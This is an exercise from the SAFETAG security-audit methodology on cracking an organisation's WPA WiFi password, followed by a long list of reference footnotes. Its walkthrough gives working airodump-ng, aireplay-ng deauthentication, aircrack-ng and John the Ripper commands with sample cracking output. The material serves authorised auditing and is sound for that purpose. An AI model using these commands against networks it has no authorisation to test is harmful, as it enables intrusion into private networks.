---
id: wpa-password-cracking
name: WPA Password Cracking
description: The organization’s wireless Local Area Network (WLAN) protects the network and its users with WPA encryption. This is...
origin: https://github.com/SAFETAG/SAFETAG
origin_path: master/en/exercises/wpa_password_cracking/summary.md
---
# WPA Password Cracking

## Summary

The organization’s wireless Local Area Network (WLAN) protects the network and its users with WPA encryption. This is an important security measure, and a WPA-protected wireless network is much safer than an unencrypted “open” network or a WEP-protected network. (WEP is fundamentally flawed, and extremely simple attacks have been widely known for over a decade.) However, the ease with an attacker could guess the WPA key, or “WiFi password,” is a serious issue, particularly considering its importance as an essential perimeter control. An attacker who gains access to the wireless LAN immediately bypasses many protections that network administrators, and other users of the office network, often take for granted. Put another way, anyone able to guess the WPA key is immediately “inside the firewall.”

Using a laptop and a wireless card with a standard, internal antenna (or using a customized smartphone or other small device), an attacker could easily position themselves close enough to the office to carry out the first phase of this attack, which would only take a few minutes. The second phase, which is supposed to be the difficult part, could take even less time. From the privacy of their own home or office, the attacker could use a minimally customized password dictionary to guess the WPA key .

<!--For reporting, needs time-to-break WPA password -->


## Materials Needed

* For the (most common) WPA password-based attacks, an already-prepared dictionary of words to use to attack the password will be required. See the Appendix on Audit Preparation for guidance on dictionary preparation.


## Walkthrough

An attacker can crack the office’s WPA key in approximately with a short and minimally customized password dictionary based on open information about the organization and basic word collections.

**Step 1:** The attacker customizes their WiFi password dictionary, adding phrases related to the subject: organization name, street address, phone number, email domain, wireless network name, etc. Common password fragments are included, as well: qwerty, 12345, asdf and all four-digit dates back to the year 2001, for example, among others. The attacker may then add hundreds or thousands of words (in English and/or other relevant languages).

See the Dictionary Creation example under Preparation for details on password dictionary buidling.

**Step 2:** The attacker would then begin recording all (encrypted) wireless traffic associated with the organization’s access point:

```
$ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0

 CH  1 ][ Elapsed: 12 mins ][ 2012-01-23 12:34 ][ fixed channel mon0: -1
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 1A:2B:3C:4D:5E:6F  -70 100    12345    43210    6   1  12e. WPA2 CCMP   PSK sampleorg
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes
 1A:2B:3C:4D:5E:6F  01:23:45:67:89:01    0    0e- 0e   186    12345
 1A:2B:3C:4D:5E:6F  AB:CD:EF:AB:CD:EF    0    1e- 1      0     1234
 1A:2B:3C:4D:5E:6F  AA:BB:CC:DD:EE:FF  -76    0e- 1      0     1122
 1A:2B:3C:4D:5E:6F  A1:B2:C3:D4:E5:F6  -80    0e- 1      0     4321
```

wifite is also useful for this step, and claims to automatically de-auth (step 3).

**Step 3:** Next, the auditor forces a wireless client, possibly chosen at random, to disconnect and reconnect (an operation that is nearly always invisible to the user).

In the example below, AB:CD:EF:AB:CD:EF is the MAC address of a laptop that was briefly disconnected in this way.

```
$ aireplay-ng -0 1 -a 1A:2B:3C:4D:5E:6F -c AB:CD:EF:AB:CD:EF mon0

 15:54:48  Waiting for beacon frame (BSSID: 1A:2B:3C:4D:5E:6F) on channel -1
 15:54:49  Sending 64 directed DeAuth. STMAC: [AB:CD:EF:AB:CD:EF] [ 5| 3 ACKs]
```

The goal of this step is to capture the cryptographic handshake that occurs when the targeted client reconnects. Try using different clients if the first one doesn't work, or try (physically) moving around.

This handshake does not contain the WPA key itself, but once the the complete handshake process has been seen, the auditor (or a potential attacker) can leave the vicinity and run various password cracking tools to try and discover the password. While a complete password cracking tutorial is out of scope for SAFETAG documentation, below are three strategies:

**Step 4:** The auditor attempts to discover the WPA password.

A good wordlist with a few tweaks tends to break an unforunate number of passwords.  Using a collection of all english words, all words from the language of the organization being audited, plus a combination of all these words, plus relevant keywords, addresses, and years tends to crack most wifi passwords.

```bash
    $ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap
```

For WPA captures, John can either feed in to an aircrack process or attack a capture directly.  For captures, you first have to convert the .cap file (from wireshark, wifite, airodump, etc.) to a format that John likes.  The Jumbo version we use has conversion tools for this available:

```bash
  $wpapcap2john wpa.cap > crackme
  $./john -w:password.lst -fo=wpapsk-cuda crackme
```

##### Results
Successful password cracking via piping these into aircrack-ng:

```
 Opening sampleorg_airodump-01.cap
 Reading packets, please wait...
                                 Aircrack-ng 1.1
                    [00:00:05] 9123 keys tested (1876.54 k/s)
                           KEY FOUND! [ sample2012 ]

      Master Key     : 2A 7C B1 92 C4 61 A9 F6 7F 98 6B C1 AB 53 7A 0F
                       3C AF D7 9A 0C BD F0 4B A2 44 EE 5B 13 94 12 12

      Transient Key  : A9 C8 AD 47 F9 71 2A C6 55 F8 F0 73 FB 9A E6 1D
                       23 D9 31 25 5D B1 CF EA 99 2C B3 D7 E5 7F 91 2D
                       56 25 D5 9A 1F AD C5 02 E3 2C C9 ED 74 55 BA 94
                       D6 F5 0A D1 3B FB 39 40 19 C9 BA 65 2E 49 3D 14

      EAPOL HMAC     : F1 DF 09 C4 5A 96 0B AD 83 DD F9 07 4E FA 19 74
```

The fourth line of the above output provides some useful information about the effectiveness of a strong WPA key. That rate of approximately 2000 keys per second means that a full-on, brute-force attack against a similar-length key that was truly random (and therefore immune to dictionary-based attacks) would take about 70^9 or 20 trillion seconds, which is well over 600,000 years. Or, for those who favor length and simplicity over brevity and complexity, a key containing four words chosen from among the 10,000 most common English dictionary words would still take approximately 150,000 years to crack (using this method on an average laptop).

It is worth noting that an attacker with the resources and the expertise could increase this rate by a factor of a hundred. Using a computer with powerful graphical processing units (GPUs) or a cloud computing service like Amazon’s EC2, it is possible to test 250,000 or more keys per second. A setup like this would still take several lifetimes to guess a strong password, however.

Regardless, the success of this attack against a wireless network would allow an attacker to bypass all perimeter controls, including the network firewall. Without access to the office LAN, a non-ISP, non-government attacker would have to position himself on the same network as an external staff member in order to exploit any flaws in the organization’s email or file-sharing services. With access to the local network, however, that attacker could begin carrying out Local attacks quite quickly, and from a distance.

With regard to the distance from which an attacker could maintain such access, the office WiFi network appears to have a relatively strong signal, which extends to the street out front:

{photograph of location}

Figure 1: WiFi signal strength from a nearby location

{screenshot of WiFi strength}


##### Material that may be Useful:

  * *Tutorial:* [“How to Crack WPA/WPA2”](http://www.aircrack-ng.org/doku.php?id=cracking_wpa) (Aircrack-ng Wiki)
[“Aircrack-ng”](http://www.aircrack-ng.org/doku.php?id=aircrack-ng) (Aircrack-ng Wiki)
  * *Documentation:* [“Aireplay-ng”](http://www.aircrack-ng.org/doku.php?id=aireplay-ng) (Aircrack-ng Wiki)
  * *Documentation:* [“Airodump-ng”](http://www.aircrack-ng.org/doku.php?id=airodump-ng) (Aircrack-ng Wiki)



<!-- Notes -->

[^external_funding_and_reporting]:Usually when working with an external funder an engagement report, free of sensitive data about the host organization, will be created for submission the funder. The contents of this report should be clearly outlined and agreed to during the assessment plan stage.

<!-- Penetration/Security/Risk Testing Standards / Guides -->

[^NIST_SP_800-115]:[NIST SP 800-115, Technical Guide to Information Security Testing and Assessment](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf)

[^pen_testing_systematic]:[Penetration Testing - A Systematic Approach](http://www.infosecwriters.com/text_resources/pdf/PenTest_MSaindane.pdf)

[^NIST_SP_800-115_planning]:[NIST SP 800-115, Technical Guide to Information Security Testing and Assessment - Planning Methodology](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=13)

[^NIST_SP_800-115_assessment_plan]:[NIST SP 800-115, Technical Guide to Information Security Testing and Assessment](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=51)

[^NIST_SP_800-115-Section_7.1]:[NIST SP 800-115, Technical Guide to Information Security Testing and Assessment. Section 7.1 Coordination](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=55)

[^NIST_SP_800-115_targeting]:[NIST SP 800-115, Technical Guide to Information Security Testing and Assessment](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=40)

[^NIST_SP_800-115-travel_prep]:["Traveling teams should maintain a flyaway kit that includes systems, images, additional tools, cables, projectors, and other equipment that a team may need when performing testing at other locations."](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=50)

[^pets_pre-engagement_location]:[Determining Audit Location - The Penetration Testing Execution Standard: Pre-Engagement Guidelines](http://www.pentest-standard.org/index.php/Pre-engagement#Locations)

[^pets_emergency_contact_info]:[Emergency Contact and Incidents - The Penetration Testing Execution Standard: Pre-Engagement Guidelines](http://www.pentest-standard.org/index.php/Pre-engagement#Emergency_Contact_Information)

[^interaction_security_risk_management]:[Security Risk Management: NGO Approach - InterAction Security Unit](https://www.scribd.com/doc/156488867/Srm)

[^workbook_on_security]:[Workbook on Security: Practical Steps for Human Rights Defenders at Risk](http://frontlinedefenders.org/files/workbook_eng.pdf)

[^OSSTMM_wireless_security_testing]:[Open Source Security Testing Methodology Manual (OSSTMM) p. 140.](http://www.isecom.org/research/osstmm.html)

<!-- Threat Modeling -->

[^shostack_anchoring]: See: "Threat Modeling: Designing for Security" by Adam Shostack, p. 298. 

[^NIST_SP_800_115_soc_eng_hostile]:["Individual targeting can lead to embarrassment for those individuals if testers successfully elicit information or gain access. It is important that the results of social engineering testing are used to improve the security of the organization and not to single out individuals."](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf)

[^GPR_8_Likelihood]:["Likelihood: Chapter 2.7 p. 47 - Operational Security Management in Violent Environments"](http://www.odihpn.org/download/gpr_8_revised2pdf#page=38)

[^GPR_8_impacts]:["Impacts: Chapter 2.7 p. 46 - Operational Security Management in Violent Environments"](http://www.odihpn.org/download/gpr_8_revised2pdf#page=38)

<!-- Facilitation -->

[^psych_sec_training]:[The Psychological Underpinnings of Security Training - Craig Higson-Smith](https://www.level-up.cc/resources-for-trainers/holistic/psychological-underpinnings-security-training)

[^event_planning_input]:[Event Planning Inputs - Level-Up](https://www.level-up.cc/leading-trainings/event-planning)

[^integratedsecurity_prep_tips]:[Integrated Security Facilitator Preparation Tips](http://integratedsecuritymanual.org/sites/default/files/integratedsecurity_themanual_1.pdf#page=25)

[^integrated_security_manual]:[Integrated security: The Manual](http://integratedsecuritymanual.org/download-this-manual)

<!-- Censorship Measurement -->

[^herdict_explore]:[Herdict "At-A-Glance" web-blockage dashboard](http://herdict.org/explore/indephth)

<!-- ONI -->

[^ONI_country]:[Open Network Initiative - Country Reports](https://opennet.net/research/profiles)

[^ONI_regional]:[Open Network Inititiative - Regional Overviews](https://opennet.net/research/regions)

[^alkasir]:[A Cyber-Censorship Map automatically plotted based on the data collected from the database that is updated through usage patterns of alkasir software.](https://alkasir.com/map)

[^transparency]:[Who publishes Transparency Reports?](http://jameslosey.com/post/98162645081/who-publishes-transparency-reports-here-is-an)

[^alexa]:[The top 500 sites in each country or territory.](http://www.alexa.com/topsites/countries)

<!-- Country Infrastructure info -->

[^cia_factbook]:[CIA fact-book](https://www.cia.gov/library/publications/the-world-factbook/)

[^cia_factbook_internet-users]:[CIA fact-book country comparison of number of users within a country that access the Internet](https://www.cia.gov/library/publications/the-world-factbook/fields/2153.html)

[^cia_factbook_broadcast-media]:[CIA fact-book country comparison of the approximate number of public and private TV and radio stations in a country](https://www.cia.gov/library/publications/the-world-factbook/fields/2213.html)

[^cia_factbook_telephone-system]:[CIA fact-book country comparison of the telephone system with details on the domestic and international components.](https://www.cia.gov/library/publications/the-world-factbook/fields/2124.html)

[^WTICT_indicators]:[World Telecommunication/ICT Indicators database 2014](http://www.itu.int/en/ITU-D/Statistics/Pages/publications/wtid.aspx)


<!-- Media / Speech Freedom Threats -->

[^threatened_voices]:[Threatened Voices: Tracking suppression of online free speech.](http://threatened.globalvoicesonline.org/)

[^media_sustainability_index]:[IREX’s Media Sustainability Index (MSI) provides in-depth analyses of the conditions for independent media in 80 countries across the world.](http://www.irex.org/project/media-sustainability-index-msi)

[^freedom_on_the_net]:[Freedom House's "Freedom on the Net" index, assessing the degree of internet and digital media freedom around the world.](http://www.freedomhouse.org/report-types/freedom-net)

[^freedom_of_the_press]:[Freedom House's "Freedom of the Press" index assess' global media freedom.](http://www.freedomhouse.org/report-types/freedom-press)

[^article_19_by_country]:[ARTICLE 19 freedom of expression and freedom of information news by region.](http://www.article19.org/pages/en/where-we-work.html)

[^OSF_digital_media]:[Open Society Foundation - Mapping digital media](http://www.opensocietyfoundations.org/projects/mapping-digital-media)

[^press_freedom_index]:[Press Freedom Index (RSF)](https://en.rsf.org/press-freedom-index.html)

[^press_freedom_index_methodology]:[Press Freedom Index Methodology (RSF)](http://rsf.org/index2014/data/2014_wpfi_methodology.pdf)


<!-- Human Rights and Governance-->

[^freedom_in_the_world]:[Freedom House's "Freedom in the World" index is the standard-setting comparative assessment of global political rights and civil liberties.](http://www.freedomhouse.org/report-types/freedom-world)

[^corruptions_perception_index]:[Corruption  Perception  Index](http://www.transparency.org/cpi2013/results/)

[^Amnesty_regional_news]:[Amnesty International regional news on human rights](https://www.amnesty.org/en/news/regional)

[^HRW_regional_work]:[Human Rights Watch - Browse by Region](http://www.hrw.org/regions)

<!-- Surveillance and Censorship -->

[^pi_country_reports]:[Privacy International's in-depth country reports and submissions to the United Nations.](https://www.privacyinternational.org/resources/reports)

[^surveillance_whos_who]:[Surveillance Who's Who exposes the government agencies that attended ISS World surveillance trade shows between 2006 and 2011.](https://www.privacyinternational.org/resources/surveillance-whos-who)

[^ISC_country_reports]:[The ISC Project completes evaluations of information security threats in a broad range of countries. The resulting comprehensive written assessments describe each country’s digital security situation through consideration of four main categories: online surveillance, online attacks, online censorship, and user profile/access.](https://iscproject.org/country-assessments/)


<!-- Security Risks -->

[^EISF_Alerts]:[EISF distributes frequent analysis and summaries of issues relevant to humanitarian security risk management.](http://www.eisf.eu/alerts/)

[^PETS_legal_considerations]:[" Some activities common in penetration tests may violate local laws. For this reason, it is advised to check the legality of common pentest tasks in the location where the work is to be performed."](http://www.pentest-standard.org/index.php/Pre-engagement#Legal_Considerations)

[^PTES_testing]:[Vulnerability Analysis - The Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Vulnerability_Analysis)

[^NIST_800_14_user_issues]:[NIST SP 800-14, Generally Accepted Principles and Practices for Securing Information Technology Systems](http://csrc.nist.gov/publications/nistpubs/800-14/800-14.pdf#page=30)

[^NIST_exploit_confirm]:["While vulnerability scanners check only for the possible existence of a vulnerability, the attack phase of a penetration test exploits the vulne rability to confirm its existence."](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=38)

[^shostack_finding_threats]: See: "Threat Modeling: Designing for Security" by Adam Shostack, p. 125. 

[^shostack_addressing_threats]: See: "Threat Modeling: Designing for Security" by Adam Shostack, p. 167. 

[^shostack]: "Threat Modeling: Designing for Security" by Adam Shostack

[^shostack_flow]: See: "Threat Modeling: Designing for Security" by Adam Shostack, p. 408.

[^shostack_reports]: See: "Threat Modeling: Designing for Security" by Adam Shostack, p. 401.

[^secure_reporting]:"When a pilot lands an airliner, their job isn’t over. They still have to navigate the myriad of taxiways and park at the gate safely. The same is true of you and your pen test reports, just because its finished doesn't mean you can switch off entirely. You still have to get the report out to the client, and you have to do so securely. Electronic distribution using public key cryptography is probably the best option, but not always possible. If symmetric encryption is to be used, a strong key should be used and must be transmitted out of band. Under no circumstances should a report be transmitted unencrypted. It all sounds like common sense, but all too often people fall down at the final hurdle." - [The Art of Writing Penetration Test Reports](http://resources.infosecinstitute.com/writing-penetration-testing-reports/)

[^stares_and_snide_comments]:"I once performed a social engineering test, the results of which were less than ideal for the client. The enraged CEO shared the report with the whole organization, as a way of raising awareness of social engineering attacks. This was made more interesting, when I visited that same company a few weeks later to deliver some security awareness training. During my introduction, I explained that my company did security testing and was responsible for the social engineering test a few weeks back. This was greeted with angry stares and snide comments about how I’d gotten them all into trouble. My response was, as always, “better to give me your passwords than a genuine bad guy”." - [The Art of Writing Penetration Test Reports](http://resources.infosecinstitute.com/writing-penetration-testing-reports/)

[^NIST_pen_test_danger]:"Penetration testing also poses a high risk to the organization’s networks and systems because it uses real exploits and attacks against production systems and data. Because of its high cost and potential impact, penetration testing of an organization’s network and systems on an annual basis may be sufficient. Also, penetration testing can be designed to stop when the tester reaches a point when an additional action will cause damage." - [NIST SP 800-115, Technical Guide to Information Security Testing and Assessment](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=40)

[^PETS_third_parties]:[Dealing with third parties - The Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Pre-engagement#Dealing_with_Third_Parties)

[^PETS_separate_permissions]:["In addition, some service providers require advance notice and/or separate permission prior to testing their systems. For example, Amazon has an online request form that must be completed, and the request must be approved before scanning any hosts on their cloud. If this is required, it should be part of the document."](http://www.pentest-standard.org/index.php/Pre-engagement#Permission_to_Test)

[^PETS_emergency_contact]:["Obviously, being able to get in touch with the customer or target organization in an emergency is vital."](http://www.pentest-standard.org/index.php/Pre-engagement#Emergency_Contact_Information)

[^PETS_host_and_ip]:["Before starting a penetration test, all targets must be identified. "](http://www.pentest-standard.org/index.php/Pre-engagement#Specify_IP_Ranges_and_Domains)

[^PETS_logical_intel]:[Accumulating information about partners, clients, and competitors - The Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Intelligence_Gathering#Logical)

[^NIST_incident_repose_plan]:["the assessment plan should provide specific guidance on incident handling in the event that assessors cause or uncover an incident during the course of the assessment. This section of the plan should define the term incident and provide guidelines for determining whether or not an incident has occurred. The plan should identify specific primary and alternate points of contact for the assessors... The assessment plan should provide clear-cut instructions on what actions assessors should take in these situations."](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=52)

[^PETS_permission_to_test]:["One of the most important documents which need to be obtained for a penetration test is the Permission to Test document."](http://www.pentest-standard.org/index.php/Pre-engagement#Permission_to_Test)

[^PETS_evidence_handling]:["When handling evidence of a test and the differing stages of the report it is incredibly important to take extreme care with the data. Always use encryption and sanitize your test machine between tests."](http://www.pentest-standard.org/index.php/Pre-engagement#Evidence_Handling)

[^org_vuln_analysis]:["Vulnerability Assessment: Training module for NGOs operating in Conflict Zones and High-Crime Areas"](https://www.eisf.eu/wp-content/uploads/2014/09/0603-Dworken-undated-Vulnerability-assesment-training-module.pdf)

[^cryptolaw]:["A survey of existing and proposed laws and regulations on cryptography - systems used for protecting information against unauthorized access."](http://www.cryptolaw.org/) (The Crypto Law Survey)

<!-- Malware and Threat reports --> 

[^staying_abreast_of_tech_and_threats]:["Assessors need to remain abreast of new technology and the latest means by which an adversary may attack that technology. They should periodically refresh their knowledge base, reassess their methodology-updating techniques as appropriate, and update their tool kits."](http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf#page=47)

[^symantec_annual_threat_report]:[The Internet Annual Security Threat Report provides an overview and analysis of the year in global threat activity.](http://www.symantec.com/security_response/publications/threatreport.jsp)

[^symantec_monthly_threat_report]:[The monthly intelligence report, provides the latest analysis of cyber security threats, trends, and insights from the Symantec intelligence team concerning malware, spam, and other potentially harmful business risks.](http://www.symantec.com/security_response/publications/monthlythreatreport.jsp)

[^mandiant_threat_report]:[Mandiant’s annual threat report, reveals key insights, statistics and case studies illustrating how the tools and tactics of advanced persistent threat (APT) actors have evolved over the last year. (REQUIRES EMAIL ADDRESS)](https://www.mandiant.com/resources/mandiant-reports/)

[^mcafee_threat_center]:[McAfee Labs Threat Center includes their Quarterly Threats Report, Blog, and Threat Library.](http://www.mcafee.com/us/threat-center.aspx)

[^fireeye_reports]:[FireEye provides complimentary reports on threats and trends in cyber security. (REQUIRES EMAIL ADDRESS)](http://www.fireeye.com/info-center/)

[^verizon_data_breach_report]:[Verizon Data Breach Investigative Report (REQUIRES EMAIL ADDRESS)](http://www.verizonenterprise.com/DBIR/)

[^internet_storm_center]:[SANS: Internet Storm Center](https://isc.sans.edu//)

[^mcafee_threat_trends]:[McAfee Threat Trends Papers](www.mcafee.com/us/security-awareness/threat-trends.aspx)

[^us-cert_current_activity]:[US-CERT Current Activity web page is a regularly updated summary of the most frequent, high-impact types of security incidents currently being reported](https://www.us-cert.gov/ncas/current-activity/)

[^us-cert_bulletins]:[US-CERT Bulletins provide weekly summaries of new vulnerabilities.](https://www.us-cert.gov/ncas/bulletins/)

[^citi_lab_exec_recon]:[Communities @ Risk: Targeted Digital Threats Against Civil Society - Execurtive Summary](https://targetedthreats.net/media/1-ExecutiveSummary.pdf#page=21)

[^social_engineering_important_all]:["CSOs should gradually build a culture in which all staff, regardless of technical background, feel some responsibility for their own digital hygiene. While staff need not become technical experts, CSOs should attempt to raise the awareness of every staff member, from executive directors to interns - groups are only as strong as their weakest link—so that they can spot issues, reduce vulnerabilities, know where to go for further help, and educate others."](https://targetedthreats.net/media/1-ExecutiveSummary.pdf#page=30)

[^informed_staff_decisions]:["Of course, there is no way to anticipate and warn against every form of digital threat; new technologies and new threats emerge constantly, outpacing security awareness. In such an environment, it is important for CSOs to develop a framework for critical thinking and informed decision-making by their staff about digital threats, not tethered to any specific application, device, attack vector, or situation."](https://targetedthreats.net/media/1-ExecutiveSummary.pdf#page=30)

[^secuna_country_reports]:["Secunia Country Reports"](https://secunia.com/resources/countryreports/)

<!-- Security Advisories -->

[^Microsoft_Security_Bulletin]:[Microsoft Security Bulletin](https://technet.microsoft.com/en-us/security/bulletin)

[^ind_univ_external_advisories]:["In-Depth Reading, Vendor Information, & External Advisories"](https://protect.iu.edu/cybersecurity/indepth)

[^OSS_Security_advisories]:["Security-Related Vendor Information"](http://oss-security.openwall.org/wiki/vendors)

[^CERT_CC_Advisories]:["CERT/CC Advisories"](https://www.cert.org/historical/advisories/)

[^CERT_vuln_notes]:["Vulnerability Notes Database"](http://www.kb.cert.org/vuls)

[^security_tracker]:["Security Tracker"](http://securitytracker.com/topics/topics.html)

[^mozilla_vulns]:["Known Vulnerabilities in Mozilla Products"](https://www.mozilla.org/security/known-vulnerabilities/)

[^packetstorm_news]:["Packet Storm News"](http://packetstormsecurity.com/files/)

<!-- Technical Training & Guides -->

[^security_tube]:["Comprehensive, Hands-on, Practical and Affordable infosec training."](http://www.securitytube.net)

[^recon-ng_data_flow]:[The flow of information through the Recon-ng  framework. (See: "Data Flow" section)](http://www.lanmaster53.com/2014/05/recon-ng-update)

[^recon-ng_API_keys]:[Acquiring API Keys](https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide#!acquiring-api-keys)
[^security_in_a_box_physical]:[How to protect your information from physical threats - Security in-a-box](https://securityinabox.org/chapter-2)

[^speak_safe_keeping_data_safe]:[Keeping Your Data Safe - Surveillance Self-Defense](https://ssd.eff.org/en/module/keeping-your-data-safe)

<!-- Tech adoption and usability --> 

[^email_adoption_for_paranoid]:["Everyone except computer support staff said
encrypting all e-mail messages was unnecessary. In fact, several mentioned encrypting all messages was for paranoid people rather than pragmatic ones."](https://cups.cs.cmu.edu/soups/2005/2005posters/10-gaw.pdf)

<!-- Sections -->

[^auditor_trainee_tool_resource_list]:[See the auditor trainee resource list](#auditor-trainee-tool-resource-list)

[^social_engineering_toolkit_resources]:[Auditor Tool Resource List - Social Engineering](#social-engineering-toolkit)

[^password_dictionary_resources]:[Auditor Tool Resource List - Password Dictionary Creation](#password-dictionary-creation)

[^social_engineering_section]:[Auditor Tool Resource List - Social Engineering](#social-engineering-toolkit)

[^latest_version_of_tools]:[See the auditor trainee resource list](#auditor-trainee-tool-resource-list)

[^vulnerability_analysis]:[See: Vulnerability Analysis](#vulnerability-analysis)

[^roadmap_development]:[See: Roadmap Development](#roadmap-development)

[^password-security]:[Password Security](#password-security)

[^network-access]:[Network Access](#network-access)

[^privilege-separation-across-os]:[Privilege Separation Across OS](#privilege-separation-across-os)

[^examining-firewalls-across-os]:[Examining Firewalls Across OS](#examining-firewalls-across-os)

[^identifying-software-versions]:[Identifying Software Versions](#identifying-software-versions)

[^anti-virus-updates]:[Anti-Virus Updates](#anti-virus-updates)

[^automated-vulnerability-assessment-tools]:[Automated Vulnerability Assessment Tools](#automated-vulnerability-assessment-tools)

[^identifying-lockout-thresholds]:[Identifying Lockout Thresholds](#identifying-lockout-thresholds)

[^identifying-oddone-off-services]:[Identifying Odd/One-Off Services](#identifying-oddone-off-services)

[^device_encryption_by_os]:[Device Encryption By OS Type](#device-encryption-by-os)

<!-- Appendices -->

[^travel_kit_appendix]:[APPENDIX A - Auditor travel kit checklist](#appendix-a)

[^personal_information_to_keep_private]:[APPENDIX B - Personal Information to Keep Private](#appendix-b)

[^password_survey]:[APPENDIX C - Password Survey](#appendix-c)

[^auditor_consent_template]:[APPENDIX D - Auditor Consent Template.](#appendix-d)

[^pre-mortum]:["Pre-Mortum Strategy" - Sources of Power: How People Make Decisions - p.71](http://books.google.com/books?id=nn1kGwL4hRgC&lpg=PP1&pg=PA71#v=onepage&q&f=false)
<!-- Interview -->

[^scope_questions]:["Questionnaires - The Penetration Testing Execution Standard"](http://www.pentest-standard.org/index.php/Pre-engagement#Questionnaires)

[^HCD_toolkit]:["IDEO Human-Centered Design Toolkit"](http://www.ideo.com/work/human-centered-design-toolkit)

[^Techscape_indicators]:["TechScape Indicators - the engine room"](https://www.theengineroom.org/projects/techscape/tsindicators/)

[^BUM_questions]:["Questions for Business Unit Managers - The Penetration Testing Execution Standard"](http://www.pentest-standard.org/index.php/Pre-engagement#Questions_for_Business_Unit_Managers)

[^SA_Questions]:["Questions for Systems Administrators"](http://www.pentest-standard.org/index.php/Pre-engagement#Questions_for_Systems_Administrators)

